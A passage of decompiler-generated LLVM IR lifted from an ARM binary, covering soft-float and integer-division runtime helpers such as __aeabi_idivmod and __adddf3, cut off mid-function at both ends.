  br i1 %v4_1d4a0, label %dec_label_pc_1d54c, label %dec_label_pc_1d4a8

dec_label_pc_1d4a8:                               ; preds = %dec_label_pc_1d4a0
  %v3_1d4a8 = icmp ult i32 %v1_1d550, 536870912
  br i1 %v3_1d4a8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1d4a8
  %v4_1d4ac = mul i32 %v1_1d550, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1d4a8, %.thread
  %v0_1d4cc.pr40.ph = phi i32 [ %v4_1d4ac, %.thread ], [ %v1_1d550, %dec_label_pc_1d4a8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1d4a8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1d4cc.pr40 = phi i32 [ %v4_1d4c0, %bb89 ], [ %v0_1d4cc.pr40.ph, %.preheader.preheader ]
  %v1_1d4c4 = phi i32 [ %v4_1d4c4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1d4b8 = icmp ugt i32 %v0_1d4cc.pr40, 268435455
  br i1 %v2_1d4b8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1d4ccthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1d4bc = icmp ult i32 %v0_1d4cc.pr40, %v0_1d584
  br i1 %v4_1d4bc, label %bb88, label %dec_label_pc_1d4ccthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1d4c0 = and i32 %v0_1d4cc.pr40, 268435456
  %v3_1d4c0 = icmp eq i32 %v2_1d4c0, 0
  %v4_1d4c0 = mul i32 %v0_1d4cc.pr40, 16
  br i1 %v3_1d4c0, label %bb89, label %dec_label_pc_1d4cc.loopexit

bb89:                                             ; preds = %bb88
  %v2_1d4c4 = and i32 %v1_1d4c4, 268435456
  %v3_1d4c4 = icmp eq i32 %v2_1d4c4, 0
  %v4_1d4c4 = mul i32 %v1_1d4c4, 16
  br i1 %v3_1d4c4, label %.preheader, label %dec_label_pc_1d4ccthread-pre-split.loopexit.loopexit

dec_label_pc_1d4ccthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1d4d852.ph = phi i32 [ %v1_1d4c4, %bb87 ], [ %v4_1d4c4, %bb89 ]
  %v0_1d4cc.pr42.ph = phi i32 [ %v0_1d4cc.pr40, %bb87 ], [ %v4_1d4c0, %bb89 ]
  br label %dec_label_pc_1d4ccthread-pre-split.loopexit

dec_label_pc_1d4ccthread-pre-split.loopexit:      ; preds = %dec_label_pc_1d4ccthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1d4d852 = phi i32 [ %v1_1d4c4, %.thread3 ], [ %v1_1d4d852.ph, %dec_label_pc_1d4ccthread-pre-split.loopexit.loopexit ]
  %v0_1d4cc.pr42 = phi i32 [ %v0_1d4cc.pr40, %.thread3 ], [ %v0_1d4cc.pr42.ph, %dec_label_pc_1d4ccthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1d4ccthread-pre-split

dec_label_pc_1d4ccthread-pre-split:               ; preds = %dec_label_pc_1d4ccthread-pre-split.loopexit, %bb91
  %v1_1d4d850 = phi i32 [ %v1_1d4d852, %dec_label_pc_1d4ccthread-pre-split.loopexit ], [ %v3_1d4d8, %bb91 ]
  %v2_1d4d048 = phi i32 [ %v0_1d584, %dec_label_pc_1d4ccthread-pre-split.loopexit ], [ %v2_1d4d0, %bb91 ]
  %v0_1d4cc.pr = phi i32 [ %v0_1d4cc.pr42, %dec_label_pc_1d4ccthread-pre-split.loopexit ], [ %v3_1d4d4, %bb91 ]
  br label %dec_label_pc_1d4cc

dec_label_pc_1d4cc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1d4cc

dec_label_pc_1d4cc:                               ; preds = %dec_label_pc_1d4cc.loopexit, %dec_label_pc_1d4ccthread-pre-split
  %v1_1d4d8 = phi i32 [ %v1_1d4d850, %dec_label_pc_1d4ccthread-pre-split ], [ %v1_1d4c4, %dec_label_pc_1d4cc.loopexit ]
  %v2_1d4d0 = phi i32 [ %v2_1d4d048, %dec_label_pc_1d4ccthread-pre-split ], [ %v0_1d584, %dec_label_pc_1d4cc.loopexit ]
  %v1_1d4d4 = phi i32 [ %v0_1d4cc.pr, %dec_label_pc_1d4ccthread-pre-split ], [ %v4_1d4c0, %dec_label_pc_1d4cc.loopexit ]
  %v2_1d4cc = icmp slt i32 %v1_1d4d4, 0
  br i1 %v2_1d4cc, label %dec_label_pc_1d4e0, label %bb90

bb90:                                             ; preds = %dec_label_pc_1d4cc
  %v4_1d4d0 = icmp ult i32 %v1_1d4d4, %v2_1d4d0
  br i1 %v4_1d4d0, label %bb91, label %dec_label_pc_1d4e0

bb91:                                             ; preds = %bb90
  %v3_1d4d4 = mul i32 %v1_1d4d4, 2
  %v2_1d4d8 = icmp slt i32 %v1_1d4d8, 0
  %v3_1d4d8 = mul i32 %v1_1d4d8, 2
  br i1 %v2_1d4d8, label %dec_label_pc_1d4e0, label %dec_label_pc_1d4ccthread-pre-split

dec_label_pc_1d4e0:                               ; preds = %bb90, %dec_label_pc_1d4cc, %bb91
  %v2_1d4ec63 = phi i32 [ %v3_1d4d8, %bb91 ], [ %v1_1d4d8, %bb90 ], [ %v1_1d4d8, %dec_label_pc_1d4cc ]
  %v1_1d4e455 = phi i32 [ %v3_1d4d4, %bb91 ], [ %v1_1d4d4, %bb90 ], [ %v1_1d4d4, %dec_label_pc_1d4cc ]
  br label %dec_label_pc_1d4e4

dec_label_pc_1d4e4:                               ; preds = %.thread13, %dec_label_pc_1d4e0
  %v1_1d518 = phi i32 [ %v4_1d518, %.thread13 ], [ %v2_1d4ec63, %dec_label_pc_1d4e0 ]
  %v1_1d4ec = phi i32 [ %v1_1d528, %.thread13 ], [ 0, %dec_label_pc_1d4e0 ]
  %v1_1d51c = phi i32 [ %v4_1d51c, %.thread13 ], [ %v1_1d4e455, %dec_label_pc_1d4e0 ]
  %v1_1d4e8 = phi i32 [ %v0_1d514, %.thread13 ], [ %v0_1d584, %dec_label_pc_1d4e0 ]
  %v3_1d4e4 = icmp ult i32 %v1_1d4e8, %v1_1d51c
  br i1 %v3_1d4e4, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1d4e4
  %v3_1d4e8 = sub i32 %v1_1d4e8, %v1_1d51c
  %v3_1d4ec = or i32 %v1_1d4ec, %v1_1d518
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1d4e4, %bb92
  %v1_1d4f4 = phi i32 [ %v1_1d4e8, %dec_label_pc_1d4e4 ], [ %v3_1d4e8, %bb92 ]
  %v1_1d4f8 = phi i32 [ %v1_1d4ec, %dec_label_pc_1d4e4 ], [ %v3_1d4ec, %bb92 ]
  %v4_1d4f0 = udiv i32 %v1_1d51c, 2
  %v6_1d4f0 = icmp ult i32 %v1_1d4f4, %v4_1d4f0
  br i1 %v6_1d4f0, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1d4f4 = urem i32 %v1_1d51c, 2
  %v4_1d4f4 = icmp eq i32 %v3_1d4f4, 0
  %v6_1d4f4 = sub i32 %v1_1d4f4, %v4_1d4f0
  br i1 %v4_1d4f4, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1d4f8 = udiv i32 %v1_1d518, 2
  %v6_1d4f8 = or i32 %v1_1d4f8, %v5_1d4f8
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1d500 = phi i32 [ %v6_1d4f4, %bb93 ], [ %v1_1d4f4, %.thread8 ], [ %v6_1d4f4, %bb94 ]
  %v1_1d504 = phi i32 [ %v1_1d4f8, %bb93 ], [ %v1_1d4f8, %.thread8 ], [ %v6_1d4f8, %bb94 ]
  %v4_1d4fc = udiv i32 %v1_1d51c, 4
  %v6_1d4fc = icmp ult i32 %v1_1d500, %v4_1d4fc
  br i1 %v6_1d4fc, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1d500 = and i32 %v1_1d51c, 2
  %v4_1d500 = icmp eq i32 %v3_1d500, 0
  %v6_1d500 = sub i32 %v1_1d500, %v4_1d4fc
  br i1 %v4_1d500, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1d504 = udiv i32 %v1_1d518, 4
  %v6_1d504 = or i32 %v1_1d504, %v5_1d504
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1d50c = phi i32 [ %v6_1d500, %bb95 ], [ %v1_1d500, %.thread9 ], [ %v6_1d500, %bb96 ]
  %v1_1d510 = phi i32 [ %v1_1d504, %bb95 ], [ %v1_1d504, %.thread9 ], [ %v6_1d504, %bb96 ]
  %v4_1d508 = udiv i32 %v1_1d51c, 8
  %v6_1d508 = icmp ult i32 %v1_1d50c, %v4_1d508
  br i1 %v6_1d508, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1d50c = and i32 %v1_1d51c, 4
  %v4_1d50c = icmp eq i32 %v3_1d50c, 0
  %v6_1d50c = sub i32 %v1_1d50c, %v4_1d508
  br i1 %v4_1d50c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1d510 = udiv i32 %v1_1d518, 8
  %v6_1d510 = or i32 %v1_1d510, %v5_1d510
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1d528 = phi i32 [ %v1_1d510, %bb97 ], [ %v1_1d510, %.thread10 ], [ %v6_1d510, %bb98 ]
  %v0_1d514 = phi i32 [ %v6_1d50c, %bb97 ], [ %v1_1d50c, %.thread10 ], [ %v6_1d50c, %bb98 ]
  %v2_1d514 = icmp eq i32 %v0_1d514, 0
  br i1 %v2_1d514, label %dec_label_pc_1d524, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1d518, 16
  br i1 %tmp, label %dec_label_pc_1d524, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1d518 = udiv i32 %v1_1d518, 16
  %v4_1d51c = udiv i32 %v1_1d51c, 16
  br label %dec_label_pc_1d4e4

dec_label_pc_1d524:                               ; preds = %thread-pre-split12, %bb99
  %v1_1d524 = icmp slt i32 %v2_1d47c, 0
  br i1 %v1_1d524, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1d524
  %v2_1d528 = sub i32 0, %v1_1d528
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1d530, %dec_label_pc_1d524, %bb100
  %v1_1d52c = phi i32 [ %v1_1d528, %dec_label_pc_1d524 ], [ %v2_1d528, %bb100 ], [ %arg1, %dec_label_pc_1d530 ], [ %v2_1d534, %bb101 ], [ %v1_1d54880, %bb103 ], [ %v2_1d544, %bb104 ]
  ret i32 %v1_1d52c

dec_label_pc_1d530:                               ; preds = %thread-pre-split
  br i1 %v1_1d478, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1d530
  %v2_1d534 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1d53c:                               ; preds = %bb86
  br i1 %v3_1d498, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1d53c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1d53c, %bb102
  %v1_1d54880 = phi i32 [ %arg1, %dec_label_pc_1d53c ], [ 0, %bb102 ]
  br i1 %v9_1d498, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1d540 = ashr i32 %v2_1d47c, 31
  %v2_1d544 = or i32 %v4_1d540, 1
  br label %.thread16

dec_label_pc_1d54c:                               ; preds = %dec_label_pc_1d4a0
  %v2_1d54c = icmp ugt i32 %v1_1d550, 65535
  br i1 %v2_1d54c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1d54c
  %v2_1d550 = and i32 %v1_1d550, 32768
  %v3_1d550 = icmp eq i32 %v2_1d550, 0
  %v4_1d550 = udiv i32 %v1_1d550, 65536
  br i1 %v3_1d550, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1d54c
  %v0_1d55c70 = phi i32 [ %v1_1d550, %dec_label_pc_1d54c ], [ %v4_1d550, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1d560 = phi i32 [ %v0_1d55c70, %.thread19 ], [ %v4_1d550, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1d55c = icmp ugt i32 %v1_1d560, 255
  br i1 %v2_1d55c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1d560 = and i32 %v1_1d560, 128
  %v3_1d560 = icmp eq i32 %v2_1d560, 0
  %v4_1d560 = udiv i32 %v1_1d560, 256
  br i1 %v3_1d560, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1d564 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1d570 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1d564, %bb108 ]
  %v1_1d56c = phi i32 [ %v1_1d560, %bb106 ], [ %v4_1d560, %bb107 ], [ %v4_1d560, %bb108 ]
  %v2_1d568 = icmp ugt i32 %v1_1d56c, 15
  br i1 %v2_1d568, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1d56c = and i32 %v1_1d56c, 8
  %v3_1d56c = icmp eq i32 %v2_1d56c, 0
  %v4_1d56c = udiv i32 %v1_1d56c, 16
  br i1 %v3_1d56c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1d570 = add nsw i32 %v1_1d570, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1d578 = phi i32 [ %v1_1d570, %.thread20 ], [ %v1_1d570, %bb109 ], [ %v2_1d570, %bb110 ]
  %v5_1d57c = phi i32 [ %v1_1d56c, %.thread20 ], [ %v4_1d56c, %bb109 ], [ %v4_1d56c, %bb110 ]
  %v2_1d574 = icmp ugt i32 %v5_1d57c, 3
  %v7_1d574 = icmp eq i32 %v5_1d57c, 4
  %v2_1d578 = xor i1 %v7_1d574, true
  %v3_1d578 = and i1 %v2_1d574, %v2_1d578
  br i1 %v3_1d578, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1d578 = add nsw i32 %v4_1d578, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1d57c = phi i32 [ %v4_1d578, %.thread21 ], [ %v5_1d578, %bb111 ]
  %v2_1d57c = xor i1 %v2_1d574, true
  %v3_1d57c = or i1 %v7_1d574, %v2_1d57c
  br i1 %v3_1d57c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1d57c = udiv i32 %v5_1d57c, 2
  %v9_1d57c = add i32 %v4_1d57c, %v8_1d57c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1d584 = phi i32 [ %v4_1d57c, %bb112 ], [ %v9_1d57c, %bb113 ]
  %v1_1d580 = icmp slt i32 %v2_1d47c, 0
  %v6_1d584 = lshr i32 %v0_1d584, %v1_1d584
  %v2_1d588 = sub i32 0, %v6_1d584
  %v2_1d588.v6_1d584 = select i1 %v1_1d580, i32 %v2_1d588, i32 %v6_1d584
  ret i32 %v2_1d588.v6_1d584

dec_label_pc_1d590:                               ; preds = %entry
  %v0_1d594 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1d57c, { 1, 0 }
  uselistorder i1 %v7_1d574, { 1, 0 }
  uselistorder i32 %v4_1d56c, { 1, 0 }
  uselistorder i32 %v1_1d56c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d560, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1d560, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d550, { 1, 0 }
  uselistorder i32 %v0_1d514, { 1, 0 }
  uselistorder i32 %v4_1d508, { 1, 0 }
  uselistorder i32 %v1_1d510, { 1, 2, 0 }
  uselistorder i32 %v4_1d4fc, { 1, 0 }
  uselistorder i32 %v1_1d504, { 1, 2, 0 }
  uselistorder i32 %v4_1d4f0, { 1, 0 }
  uselistorder i32 %v1_1d4f8, { 1, 2, 0 }
  uselistorder i32 %v1_1d51c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1d4ec, { 1, 0 }
  uselistorder i32 %v1_1d518, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1d4d8, { 1, 0 }
  uselistorder i32 %v3_1d4d4, { 1, 0 }
  uselistorder i32 %v1_1d4d4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1d4d0, { 1, 0 }
  uselistorder i32 %v1_1d4d8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1d4c4, { 1, 0 }
  uselistorder i32 %v4_1d4c0, { 2, 1, 0 }
  uselistorder i32 %v1_1d4c4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1d4cc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1d498, { 1, 0 }
  uselistorder i32 %v1_1d550, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1d47c, { 1, 0, 2 }
  uselistorder i32 %v0_1d478, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1d524, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1d4e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d4ccthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1d5a8 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1d5a8
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1d5c0 = bitcast i64 %tmp to double
  %v9_1d5c0 = fadd double %v8_1d5c0, %arg1
  %v10_1d5c0 = fptrunc double %v9_1d5c0 to float
  %v11_1d5c0 = bitcast float %v10_1d5c0 to i32
  ret i32 %v11_1d5c0
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1d5c4 = load i32, i32* @r0, align 4
  ret i32 %v2_1d5c4
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1d5c8 = load i32, i32* @r4, align 4
  store i32 %v3_1d5c8, i32* %stack_var_-12, align 4
  %v6_1d5c8 = load i32, i32* @r5, align 4
  %v9_1d5c8 = load i32, i32* @lr, align 4
  %v0_1d5cc = load i32, i32* %r1.global-to-local, align 4
  %v2_1d5cc = mul i32 %v0_1d5cc, 2
  store i32 %v2_1d5cc, i32* %r4.global-to-local, align 4
  %v0_1d5d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d5d0 = mul i32 %v0_1d5d0, 2
  store i32 %v2_1d5d0, i32* %r5.global-to-local, align 4
  %v4_1d5d4 = icmp eq i32 %v2_1d5d0, %v2_1d5cc
  %v1_1d5d8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1d5d4, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1d5d8 = load i32, i32* %r2.global-to-local, align 4
  %v5_1d5d8 = icmp eq i32 %v2_1d5d8, %v1_1d5d8
  br i1 %v5_1d5d8, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1d5dc = or i32 %v1_1d5d8, %v2_1d5cc
  %v5_1d5dc = icmp eq i32 %v3_1d5dc, 0
  br i1 %v5_1d5dc, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1d5e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_1d5e0 = or i32 %v2_1d5e0, %v2_1d5d0
  %v5_1d5e0 = icmp eq i32 %v3_1d5e0, 0
  br i1 %v5_1d5e0, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1d5cc.off = add i32 %v2_1d5cc, 4194303
  %tmp = icmp ult i32 %v2_1d5cc.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1d5d0.off = add i32 %v2_1d5d0, 4194303
  %tmp17 = icmp ult i32 %v2_1d5d0.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1d5ec = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1d5ec, i32 ptrtoint (i32* @global_var_1d824.1212 to i32))
  %v0_1d5f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1d5f0 = udiv i32 %v0_1d5f0, 2097152
  store i32 %v3_1d5f0, i32* %r4.global-to-local, align 4
  %v1_1d5f4 = load i32, i32* %r5.global-to-local, align 4
  %v4_1d5f4 = udiv i32 %v1_1d5f4, 2097152
  %v5_1d5f4 = sub nsw i32 %v4_1d5f4, %v3_1d5f0
  %v5_1d5f8 = icmp ult i32 %v4_1d5f4, %v3_1d5f0
  br i1 %v5_1d5f8, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1d5f8 = sub nsw i32 0, %v5_1d5f4
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1d5f8, %bb13 ], [ %v5_1d5f4, %.thread3 ]
  %v0_1d61c = phi i32 [ %v7_1d5f8, %bb13 ], [ %v5_1d5f4, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1d5fc = icmp ugt i32 %v4_1d5f4, %v3_1d5f0
  br i1 %v7_1d5fc, label %dec_label_pc_1d600, label %dec_label_pc_1d61c

dec_label_pc_1d600:                               ; preds = %bb14
  %v2_1d600 = add nsw i32 %v0_1d61c, %v3_1d5f0
  store i32 %v2_1d600, i32* %r4.global-to-local, align 4
  %v0_1d604 = load i32, i32* %r0.global-to-local, align 4
  %v1_1d604 = load i32, i32* %r2.global-to-local, align 4
  %v0_1d608 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d608 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1d604, i32* %r0.global-to-local, align 4
  store i32 %v1_1d608, i32* %r1.global-to-local, align 4
  store i32 %v0_1d604, i32* %r2.global-to-local, align 4
  store i32 %v0_1d608, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d61c

dec_label_pc_1d61c:                               ; preds = %bb14, %dec_label_pc_1d600
  %tmp18 = icmp ugt i32 %v0_1d61c, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1d61c
  %v6_1d620 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1d620, i32* %r4.global-to-local, align 4
  store i32 %v6_1d5c8, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1d61c, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1d5c8)
  %v0_1d628 = load i32, i32* %r1.global-to-local, align 4
  %v3_1d628 = icmp sgt i32 %v0_1d628, -1
  %v4_1d634 = urem i32 %v0_1d628, 1048576
  %v5_1d634 = or i32 %v4_1d634, 1048576
  store i32 %v5_1d634, i32* %r1.global-to-local, align 4
  br i1 %v3_1d628, label %dec_label_pc_1d644, label %dec_label_pc_1d63c

dec_label_pc_1d63c:                               ; preds = %bb16
  %v0_1d63c = load i32, i32* %r0.global-to-local, align 4
  %v1_1d63c = sub i32 0, %v0_1d63c
  store i32 %v1_1d63c, i32* %r0.global-to-local, align 4
  %v2_1d63c = icmp eq i32 %v0_1d63c, 0
  %v2_1d640 = icmp eq i1 %v2_1d63c, false
  %v5_1d640 = sext i1 %v2_1d640 to i32
  %v6_1d640 = sub nsw i32 %v5_1d640, %v5_1d634
  store i32 %v6_1d640, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d644

dec_label_pc_1d644:                               ; preds = %bb16, %dec_label_pc_1d63c
  %v0_1d644 = load i32, i32* %r3.global-to-local, align 4
  %v3_1d644 = icmp sgt i32 %v0_1d644, -1
  %v4_1d64c = urem i32 %v0_1d644, 1048576
  %v5_1d64c = or i32 %v4_1d64c, 1048576
  store i32 %v5_1d64c, i32* %r3.global-to-local, align 4
  br i1 %v3_1d644, label %dec_label_pc_1d65c, label %dec_label_pc_1d654

dec_label_pc_1d654:                               ; preds = %dec_label_pc_1d644
  %v0_1d654 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d654 = sub i32 0, %v0_1d654
  store i32 %v1_1d654, i32* %r2.global-to-local, align 4
  %v2_1d654 = icmp eq i32 %v0_1d654, 0
  %v2_1d658 = icmp eq i1 %v2_1d654, false
  %v5_1d658 = sext i1 %v2_1d658 to i32
  %v6_1d658 = sub nsw i32 %v5_1d658, %v5_1d64c
  store i32 %v6_1d658, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d65c

dec_label_pc_1d65c:                               ; preds = %dec_label_pc_1d644, %dec_label_pc_1d654
  %v0_1d65c = load i32, i32* %r4.global-to-local, align 4
  %v1_1d65c = load i32, i32* %r5.global-to-local, align 4
  %v4_1d65c = icmp eq i32 %v1_1d65c, %v0_1d65c
  call void @__pseudo_cond_branch(i1 %v4_1d65c, i32 ptrtoint (i32* @global_var_1d80c.1213 to i32))
  %v1_1d660 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1d660

; uselistorder directives
  uselistorder i32 %v0_1d644, { 1, 0 }
  uselistorder i32 %v0_1d628, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1d5f4, { 2, 1, 0 }
  uselistorder i32 %v3_1d5f0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1d5d8, { 1, 0 }
  uselistorder i32 %v2_1d5d0, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1d5cc, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1d65c, { 1, 0 }
  uselistorder label %dec_label_pc_1d644, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1d61c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1d664() local_unnamed_addr {
dec_label_pc_1d664:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1d664 = load i32, i32* @r4, align 4
  %v1_1d664 = add i32 %v0_1d664, -1
  store i32 %v1_1d664, i32* @r4, align 4
  %v0_1d668 = load i32, i32* @r5, align 4
  %v1_1d668 = sub i32 32, %v0_1d668
  store i32 %v1_1d668, i32* @lr, align 4
  %v5_1d66c = icmp sgt i32 %v0_1d668, 32
  br i1 %v5_1d66c, label %dec_label_pc_1d688, label %dec_label_pc_1d670

dec_label_pc_1d670:                               ; preds = %dec_label_pc_1d664
  %v0_1d670 = load i32, i32* @r2, align 4
  %v6_1d670 = shl i32 %v0_1d670, %v1_1d668
  store i32 %v6_1d670, i32* %ip.global-to-local, align 4
  %v0_1d674 = load i32, i32* @r0, align 4
  %v3_1d674 = add i32 %v0_1d668, -1
  %v4_1d674 = shl i32 1, %v3_1d674
  %v7_1d674 = lshr i32 %v0_1d670, %v0_1d668
  %v8_1d674 = add i32 %v0_1d674, %v7_1d674
  %v9_1d674 = icmp ult i32 %v8_1d674, %v0_1d674
  %v0_1d678 = load i32, i32* @r1, align 4
